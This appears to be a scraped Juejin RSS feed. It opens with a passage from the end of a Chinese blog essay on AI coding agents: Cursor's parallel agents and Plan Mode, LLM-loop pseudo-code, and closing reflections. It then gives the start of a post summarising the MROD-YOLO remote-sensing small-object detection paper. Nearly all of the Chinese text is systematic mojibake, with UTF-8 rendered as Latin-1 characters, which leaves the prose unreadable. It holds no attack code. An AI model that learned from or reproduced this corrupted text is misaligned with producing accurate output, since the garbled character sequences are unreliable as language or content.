<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0db34350e2740b6b5da6a82da6dfdaf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=p1CM8qe9tcc2wtN7uad%2BZVwT3DY%3D" alt="" loading="lazy"/></p>
<p>æ”¯æŒ <strong>åŒä¸€æŒ‡ä»¤</strong> ä¸‹ï¼Œæœ€å¤šå¯ <strong>å¹¶è¡Œ</strong> (Parallel) è·‘ <strong>8 ä¸ª Agent</strong>ï¼Œæ¯ä¸ª Agent ä¼šåœ¨è‡ªå·±ç‹¬ç«‹çš„ <strong>Git worktree</strong> / <strong>æ²™ç›’å·¥ä½œåŒº</strong> å†…å·¥ä½œï¼šå„è‡ªæ”¹ä»£ç ã€buildã€è·‘æµ‹è¯•ï¼Œä¸ä¼šäº’ç›¸å†²çª (ğŸ¤¡ å°±æ˜¯è´¹ Token...)ã€‚è¿˜å¤šäº†ä¸€ä¸ª <strong>Plan Mode</strong> (<strong>å…ˆè§„åˆ’å†æ‰§è¡Œ</strong>)ï¼Œåœ¨ <strong>Agent è¾“å…¥æ¡†</strong> ä¸­æŒ‰ <strong>Shift + Tab</strong> å¯ä»¥åˆ‡æ¢åˆ°è¿™ä¸ªæ¨¡å¼ (ä¹Ÿå¯ä»¥æ‰‹åŠ¨é€‰)ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8cbde74284a24d33aba7174e1b896edd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=VACdQGZfVJLH67Db6SPWC%2BJi49Q%3D" alt="" loading="lazy"/></p>
<p><strong>Cursor</strong> ä¸ä¼šç›´æ¥å‡è®¾ä½ çš„éœ€æ±‚ï¼Œè€Œæ˜¯è¯¢é—®ä¸€ç³»åˆ—æ¾„æ¸…é—®é¢˜ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/370657afc0534f9fb6729784eeeaf376~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=GKoj%2B9sbukVbbO8gDH0JvRuSoys%3D" alt="" loading="lazy"/></p>
<p>é€šè¿‡è¿™äº›æ¾„æ¸…ï¼Œä½¿ AIè·å¾—äº†å®Œæ•´çš„ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥ç”Ÿæˆæ›´ç²¾ç¡®çš„è®¡åˆ’ï¼Œé¿å…åç»­çš„è¿”å·¥ã€‚æ¥ç€ä¼šç”Ÿæˆä¸€ä¸ª <strong>plan.md</strong> çš„è®¡åˆ’æ–‡æ¡£ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/242a870fd4dd442299eb60880e3048d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=z4Xoa1P1Fj7BMwEQoBVLcQ7ZE4o%3D" alt="" loading="lazy"/></p>
<p>ä½ å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œç¼–è¾‘ï¼šå¢åˆ ä»»åŠ¡ã€è°ƒæ•´ä»»åŠ¡é¡ºåºã€æ›´æ–°æŠ€æœ¯ç»†èŠ‚ã€è°ƒæ•´å®ç°æ–¹æ³•ç­‰ã€‚ç¡®å®šæ— è¯¯åï¼Œç‚¹å‡» <strong>Build</strong>ï¼ŒAgent ä¼šè¯»å–æœ€æ–°ç‰ˆæœ¬çš„ <strong>plan.md</strong>ï¼Œå¹¶å®Œæˆå¯¹åº”çš„ä»»åŠ¡ã€‚</p>
<p>ğŸ¤” ä¸ <strong>CC</strong> <strong>Sub Agents</strong> å¯ç¼–æ’ä¸åŒï¼Œ<strong>Cursor</strong> çš„ <strong>Agent</strong> æ›´åƒæ˜¯ä¸€ä¸ªç»„åˆèƒ½åŠ›çš„ "<strong>å¤§Agent</strong>"ï¼Œç”±å®ƒè‡ªåŠ¨ç¼–æ’å¤šä¸ªå†…åµŒçš„ã€å¯¹ç”¨æˆ·ä¸å¯è§ çš„ <strong>Agent</strong> æ¥å®Œæˆ <strong>ç”¨æˆ·æå‡ºçš„ä»»åŠ¡</strong>ï¼Œæ”¶æ•›å¤æ‚æ€§ï¼Œåªå±•ç¤ºæ”¹åŠ¨/æµ‹è¯•ç»“æœã€‚å®ƒçš„ <strong>Parallel Agents</strong> æ¢ç´¢ä¸åŒæ–¹æ¡ˆï¼Œæœ€åå†æ±‡æ€»/åˆå¹¶çš„ç©æ³•ï¼Œä¸ç®—ä¸¥æ ¼æ„ä¹‰ä¸Šçš„ "<strong>ä¸»æµå¤š Agent æ¶æ„æ¨¡å¼</strong>" ä¸­çš„ "<strong>å¹¶è¡ŒAgentsæ¨¡å¼</strong>"-æ”¯æŒæ˜¾å¼åœ°å®šä¹‰ / åˆ†é… ä¸åŒè§’è‰²çš„ Agentï¼Œå¹¶è®©å®ƒä»¬å¹¶è¡Œåä½œã€‚</p>
<p>ç±»ä¼¼çš„æ”¯æŒ "<strong>å¤šAgents</strong>" ç©æ³•çš„ AI ç¼–ç¨‹å·¥å…·è¿˜æœ‰ï¼š</p>
<ul>
<li><strong>GitHub Copilot Workspace</strong>ï¼š<strong>å¤šæ­¥éª¤ Pipeline Agents</strong>ï¼Œä»ä»»åŠ¡æè¿° â†’ ç”Ÿæˆå®Œæ•´ plan â†’ è‡ªåŠ¨æ‰§è¡Œ â†’ ä¿®æ­£ï¼Œå¤šæ­¥éª¤ cascaded agentsï¼Œè‡ªåŠ¨æ PRã€‚</li>
<li><strong>Google Gemini Code Assist</strong>ï¼š<strong>multi-expert prompt routing</strong>ï¼Œä»»åŠ¡è‡ªåŠ¨åˆ†é…ç»™æœ€æ“…é•¿çš„æ¨¡å‹/agentï¼Œå¤æ‚ monorepo æœç´¢ â†’ ä¸“å®¶ agent æä¾›ç­”æ¡ˆï¼Œé’ˆå¯¹ cloud infra çš„æ‰§è¡Œ-éªŒè¯å¾ªç¯ã€‚</li>
<li><strong>Replit çš„ AI Dev ç¯å¢ƒ</strong>ï¼š<strong>å¤šå·¥å…·æ‰§è¡Œ Agent</strong>ï¼Œè½»é‡ä¸€ç«™å¼å¤šAgentå¼€å‘æµæ°´çº¿ã€‚</li>
<li>...ç­‰ï¼Œé™äºç¯‡å¹…ï¼Œå°±ä¸å±•å¼€è®²äº†~</li>
</ul>
<p>è§‰å¾— <strong>AIç¼–ç¨‹å·¥å…·</strong> æ»¡è¶³ä¸äº†ï¼Œæ¥ç€å°±æ˜¯å›´ç»•è‡ªå·±çš„å¼€å‘æµç¨‹ï¼Œå¼€å‘åŸºäº <strong>LLM</strong> çš„ <strong>API</strong> å°è£…ä¸€äº› <strong>å°è„šæœ¬/å°å·¥å…·</strong>ã€‚</p>
<pre><code class="hljs language-python" lang="python">// æ¨è¿›å¼€å‘é—­ç¯çš„ç®€å•ä¼ªä»£ç  (éœ€æ±‚ â†’ ä¿®æ”¹ â†’ æµ‹è¯• â†’ ä¿®å¤)
plan = llm(<span class="hljs-string">"ä½ æ˜¯æ¶æ„å¸ˆï¼Œå¸®æˆ‘æ‹†è§£è¿™ä¸ªæ”¹åŠ¨éœ€æ±‚â€¦"</span>)
files = find_related_files(plan)

patches = llm(<span class="hljs-string">"ä½ æ˜¯åç«¯å¼€å‘ï¼Œåªèƒ½æ”¹è¿™äº›æ–‡ä»¶â€¦"</span>, files + plan)
apply_patches_to_workdir(patches)

test_result = run_tests()

<span class="hljs-keyword">if</span> test_result.failed:
    fix_patches = llm(<span class="hljs-string">"ä½ æ˜¯è°ƒè¯•å·¥ç¨‹å¸ˆï¼Œæ ¹æ®æŠ¥é”™ä¿®å¤â€¦"</span>,
                      test_result + current_code)
    apply_patches_to_workdir(fix_patches)
</code></pre>
<p>å¤§å¤šæ•°ä¸ªäººå¼€å‘è€…è¾¾åˆ°è¿™ä¸€å±‚ï¼ŒåŸºæœ¬å¤Ÿç”¨äº†ï¼Œå†å¾€ä¸Šå°±æ˜¯åŠ ï¼šæ—¥å¿—ã€å¯é…ç½®ã€ä¸€ç‚¹UIã€ç®€å•ä»»åŠ¡ç®¡ç†ç­‰ï¼Œå¼„æˆä¸€ä¸ªä»…ä¸ºè‡ªå·±æœåŠ¡çš„ "<strong>AI å…¨æ ˆå¼€å‘å°å¹³å°</strong>" (ğŸ˜„ æ­¤æ—¶æ›´åƒæ˜¯ä¸€ä¸ª <strong>Agent å·¥ç¨‹å¸ˆ</strong>ï¼Œæ­å»º "<strong>ä¼ä¸šçº§AIå…¨æ ˆ</strong>" çš„åŸºçŸ³)ã€‚</p>
<h4 data-id="heading-41">6.4.4. è½åœ°æ–¹æ³•è®º</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/782e1b3efe27412291fb19efbede706e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=5jlS3voGeo9clOg4X%2Bhy8aQ7C1k%3D" alt="" loading="lazy"/></p>
<p><strong>æ ¹æœ¬åŸåˆ™</strong>ï¼š</p>
<blockquote>
<p>åœ¨ä¸€ä¸ªå®Œæ•´å¼€å‘å‘¨æœŸé‡Œ (ä»æƒ³æ³•åˆ°ä¸Šçº¿)ï¼Œæœ‰æ„è¯†åœ°è®© AI å‚ä¸å°½å¯èƒ½å¤šçš„ç¯èŠ‚ï¼Œå¹¶ç”¨ "å¤šè§’è‰²æ€ç»´" æ¥ç»„ç»‡è¿™äº›è°ƒç”¨ï¼Œä½†å·¥ç¨‹å¤æ‚åº¦è¦æ§åˆ¶åœ¨ä¸ªäººèƒ½æŒç»­ç»´æŠ¤çš„èŒƒå›´å†…ã€‚</p>
</blockquote>
<hr/>
<p><strong>â‘  é¡¹ç›®çº§è‡ªæ£€</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6001709a6e840f5948fd53453836d6c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=8T24tYXPmdDIYxT6euSSLP%2BfKwU%3D" alt="" loading="lazy"/></p>
<hr/>
<p><strong>â‘¡ é¡¹ç›®é˜¶æ®µæ‹†è§£</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1cb46588f5c640dc804b0d5aebb2b032~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=%2Fd4kP4hjSJ8aD5GEYOJ27lDUI3s%3D" alt="" loading="lazy"/></p>
<hr/>
<p><strong>â‘¢ æ­å»ºå¯å¤ç”¨å·¥ä½œæµ</strong></p>
<hr/>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2bf293b3127840cabf6c7d2113a45568~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=sM9ZLOGpCvOTy5a%2BxJ7nqofbcv8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-42">7. ç»“è¯­</h2>
<p>è¡Œæ–‡è‡³æ­¤ï¼Œå†å›çœ‹è¿™ç¯‡æ‹–äº†è®¸ä¹…çš„ "<strong>å¹´ç»ˆæ€»ç»“</strong>"ï¼Œå¿ƒæƒ…æ—©å·²ä»æœ€åˆé¢å¯¹ <strong>AI ç§’è§£ Bug</strong> æ—¶çš„ "<strong>ç ´é˜²</strong>" ä¸ "<strong>è¿·èŒ«</strong>"ï¼Œå˜å¾—å¹³é™ä¸”ç¬ƒå®šï¼Œæˆ‘ä»¬ï¼š</p>
<ul>
<li>å‰¥å¼€ AI "<strong>æ™ºèƒ½</strong>" çš„å¤–è¡£ï¼Œçœ‹åˆ°äº†å®ƒä½œä¸º "<strong>æ¦‚ç‡é¢„æµ‹æœºå™¨</strong>" çš„æœ¬è´¨ã€‚</li>
<li>å­¦ä¼šç”¨ "<strong>ç»“æ„åŒ–çš„Prompt</strong>" å»é©¾é©­å®ƒï¼Œè€Œä¸æ˜¯è¢«å¹»è§‰å¸¦åã€‚</li>
<li>ä¹Ÿè§è¯äº†å¼€å‘æ¨¡å¼ä»ç®€å•çš„ <strong>Chat</strong> è¿›åŒ–æˆ <strong>Copilot</strong>ï¼Œå†åˆ°å¦‚ä»Šåˆå…·é›å½¢çš„ <strong>Agentic Workflow</strong>ã€‚</li>
</ul>
<p>ä½†å½’æ ¹ç»“åº•ï¼ŒAI å¸¦æ¥çš„æœ€å¤§å˜é‡ï¼Œ<strong>ä¸åœ¨äºå®ƒæ›¿æˆ‘ä»¬å†™äº†å¤šå°‘è¡Œä»£ç </strong>ï¼Œè€Œåœ¨äºå®ƒé‡å¡‘äº† "<strong>ä¸“ä¸š</strong>" çš„å®šä¹‰ã€‚</p>
<ul>
<li><strong>æ‡‚å¾—"åº•å±‚åŸç†"ä¾ç„¶é‡è¦</strong>â€”â€”å¦åˆ™ä½ ä¸çŸ¥é“ä¸ºä»€ä¹ˆ AI ä¼šæŠŠäººä¿®æˆ "æ±½è½¦"ï¼Œä¹Ÿæ— æ³•åœ¨å®ƒ "ä¸€æœ¬æ­£ç»èƒ¡è¯´å…«é“" æ—¶è¿›è¡Œçº åã€‚</li>
<li><strong>æ‡‚å¾—æé—®æ¯”è§£ç­”æ›´é‡è¦</strong>â€”â€” <strong>Prompt</strong> æ˜¯æ–°æ—¶ä»£çš„ç¼–ç¨‹è¯­è¨€ï¼Œ<strong>æ¸…æ™°çš„é€»è¾‘è¡¨è¾¾</strong> + <strong>å¯¹ä¸šåŠ¡çš„æ·±åº¦ç†è§£</strong>ï¼Œæ‰æ˜¯æœ€é«˜æ•ˆçš„ "<strong>ç¼–è¯‘å™¨</strong>"ã€‚</li>
<li><strong>æ‡‚å¾—æ¶æ„æ¯”å®ç°æ›´é‡è¦</strong>â€”â€”å½“ "<strong>AI å…¨æ ˆ</strong>" æˆä¸ºå¯èƒ½ï¼Œå½“ä¸€ä¸ªä¸ª Agent å¯ä»¥å„å¸å…¶èŒï¼Œæˆ‘ä»¬ä¸å†æ˜¯æ­»ç£•è¯­æ³•çš„ "æ¬ç –å·¥"ï¼Œè€Œæ›´åƒæŒ‡æŒ¥æ•°å­—åŒ–æ–½å·¥é˜Ÿçš„ "åŒ…å·¥å¤´ &amp; æ€»è®¾è®¡å¸ˆ"ã€‚</li>
</ul>
<p>"<strong>æŠ€æœ¯ç„¦è™‘</strong>" çš„è§£è¯ï¼Œä»æ¥ä¸æ˜¯æ‹’ç»å˜åŒ–ï¼Œè€Œæ˜¯æˆä¸ºå˜åŒ–çš„ä¸€éƒ¨åˆ†ã€‚ä»¥å‰ï¼Œæˆ‘ä»¬çš„å£å’æ˜¯ "<strong>ç†Ÿç»ƒåº¦+è®°å¿†åŠ›</strong>"ï¼Œä»¥ååˆ™æ˜¯ "<strong>æƒ³è±¡åŠ›+åˆ¤æ–­åŠ›+ç³»ç»Ÿå·¥ç¨‹èƒ½åŠ›</strong>"ï¼Œæ‹¥æŠ±AIï¼Œåœ¨è¿™ä¸ªå±äºåˆ›é€ è€…çš„æ—¶ä»£ï¼Œè¿›åŒ–ä¸ºæ— æ‰€ä¸èƒ½çš„ "<strong>è¶…çº§ä¸ªä½“ğŸ¦¸â€â™€ï¸</strong>"ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç«ç®­å·¥ç¨‹å¤§å­¦å¤šæ¨¡æ€é¥æ„Ÿæ£€æµ‹æ–°æ¡†æ¶MROD-YOLOï¼šå¦‚ä½•å°†å°ç›®æ ‡æ£€æµ‹ç²¾åº¦æå‡è‡³77.9%ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7581670270844321832</link>    <guid>https://juejin.cn/post/7581670270844321832</guid>    <pubDate>2025-12-09T09:40:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581670270844321832" data-draft-id="7581678301215916032" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç«ç®­å·¥ç¨‹å¤§å­¦å¤šæ¨¡æ€é¥æ„Ÿæ£€æµ‹æ–°æ¡†æ¶MROD-YOLOï¼šå¦‚ä½•å°†å°ç›®æ ‡æ£€æµ‹ç²¾åº¦æå‡è‡³77.9%ï¼Ÿ"/> <meta itemprop="keywords" content="ç®—æ³•,è®¡ç®—æœºè§†è§‰,æ·±åº¦å­¦ä¹ "/> <meta itemprop="datePublished" content="2025-12-09T09:40:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoovallyAIHub"/> <meta itemprop="url" content="https://juejin.cn/user/2461151071843739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç«ç®­å·¥ç¨‹å¤§å­¦å¤šæ¨¡æ€é¥æ„Ÿæ£€æµ‹æ–°æ¡†æ¶MROD-YOLOï¼šå¦‚ä½•å°†å°ç›®æ ‡æ£€æµ‹ç²¾åº¦æå‡è‡³77.9%ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2461151071843739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoovallyAIHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:40:28.000Z" title="Tue Dec 09 2025 09:40:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>é¥æ„Ÿå›¾åƒç›®æ ‡æ£€æµ‹åœ¨å†›äº‹ç›‘è§†ã€ç¾å®³è¯„ä¼°ã€åŸå¸‚è§„åˆ’ç­‰é¢†åŸŸå‘æŒ¥ç€ä¸å¯æ›¿ä»£çš„ä½œç”¨ã€‚ç„¶è€Œï¼Œå®é™…åº”ç”¨ä¸­é¢ä¸´çš„ä¸‰å¤§æŒ‘æˆ˜ä¸€ç›´åˆ¶çº¦ç€æŠ€æœ¯å‘å±•ï¼š</p>
<ul>
<li><strong>æ¨¡æ€å±€é™ï¼š</strong> å…‰å­¦å›¾åƒæ˜“å—å…‰ç…§ã€å¤©æ°”å½±å“ï¼Œçº¢å¤–å›¾åƒç¼ºä¹çº¹ç†ç»†èŠ‚</li>
<li><strong>å°ç›®æ ‡ç‰¹æ€§ï¼š</strong> ç›®æ ‡åƒç´ å æ¯”æä½ï¼ˆå¸¸ä¸è¶³0.1%ï¼‰ï¼Œç‰¹å¾ä¿¡æ¯æ˜“è¢«èƒŒæ™¯æ·¹æ²¡</li>
<li><strong>æ•ˆç‡ç“¶é¢ˆï¼š</strong> èˆªç©ºå¹³å°å¯¹æ¨¡å‹çš„è®¡ç®—å¤æ‚åº¦å’Œæ¨ç†é€Ÿåº¦è¦æ±‚ä¸¥è‹›</li>
</ul>
<p>ç«ç®­å·¥ç¨‹å¤§å­¦ç‹æ€å®‡åšå£«ã€æ¨å°å†ˆæ•™æˆå›¢é˜Ÿåœ¨è®ºæ–‡ã€ŠMROD-YOLO: Multimodal Joint Representation for Small Object Detection in Remote Sensing Imagery via Multiscale Iterative Aggregationã€‹ä¸­æå‡ºåˆ›æ–°è§£å†³æ–¹æ¡ˆï¼Œå°†é¥æ„Ÿå°ç›®æ ‡æ£€æµ‹çš„mAP50æŒ‡æ ‡æå‡è‡³77.9%ï¼Œè¾ƒç°æœ‰å…ˆè¿›æ¨¡å‹æé«˜4.2ä¸ªç™¾åˆ†ç‚¹ã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29be89f397f540228ce3163c358fd18c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878027&amp;x-signature=I%2BR3aLcMwIXWQjLNZ0I1riNhm9E%3D" alt="å›¾ç‰‡1.png" loading="lazy"/></p>
<p><strong>è®ºæ–‡é“¾æ¥ï¼š</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fieeexplore.ieee.org%2Fdocument%2F11085003" target="_blank" title="https://ieeexplore.ieee.org/document/11085003" ref="nofollow noopener noreferrer">ieeexplore.ieee.org/document/11â€¦</a></p>
<h2 data-id="heading-0"><strong>æ–¹æ³•æ€»è§ˆï¼šå››å¤§åˆ›æ–°æ¨¡å—ååŒå·¥ä½œ</strong></h2>
<p>MROD-YOLOæ¡†æ¶çš„æ ¸å¿ƒè®¾è®¡ç†å¿µæ˜¯é€šè¿‡å¤šæ¨¡æ€è”åˆè¡¨ç¤ºä¸å¤šå°ºåº¦ç‰¹å¾èšåˆï¼Œåœ¨ä¿æŒé«˜æ•ˆæ¨ç†çš„åŒæ—¶æœ€å¤§åŒ–åˆ©ç”¨äº’è¡¥ä¿¡æ¯ã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d87927bfacc64b25a1a9716baa3fbf4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878027&amp;x-signature=sbbUpU06LOfooC5mxoi0d8NalG0%3D" alt="å›¾ç‰‡2.png" loading="lazy"/></p>
<p>è¯¥æ¡†æ¶åŒ…å«å››å¤§æ ¸å¿ƒç»„ä»¶ï¼š</p>
<ul>
<li>å¤šæ¨¡æ€è”åˆè¡¨ç¤ºç½‘ç»œï¼ˆMJRNetï¼‰ï¼šå®ç°å¯è§å…‰ä¸çº¢å¤–å›¾åƒçš„æ—©æœŸé«˜æ•ˆèåˆ</li>
<li>æ”¹è¿›å‹éª¨å¹²ç½‘ç»œï¼šé›†æˆæ„Ÿå—é‡æ‰©å±•æœºåˆ¶ä¸ç©ºé—´æ³¨æ„åŠ›æ¨¡å—</li>
<li>å¤šå°ºåº¦è¿­ä»£èšåˆæ¨¡å—ï¼ˆMSIAï¼‰ï¼šä¼˜åŒ–é«˜ä½å±‚ç‰¹å¾äº¤äº’</li>
<li>è½»é‡åŒ–ç‰¹å¾é‡‘å­—å¡”ï¼ˆFPNï¼‰ï¼šæ›¿ä»£PANetå‡å°‘å†—ä½™è®¡ç®—</li>
</ul>
<p>è¿™ç§ç«¯åˆ°ç«¯çš„è®¾è®¡å®ç°äº†ä»å¤šæ¨¡æ€è¾“å…¥åˆ°ç›®æ ‡æ£€æµ‹è¾“å‡ºçš„é«˜æ•ˆæµç¨‹ï¼Œç‰¹åˆ«é’ˆå¯¹å°ç›®æ ‡æ£€æµ‹è¿›è¡Œäº†å…¨æ–¹ä½ä¼˜åŒ–ã€‚</p>
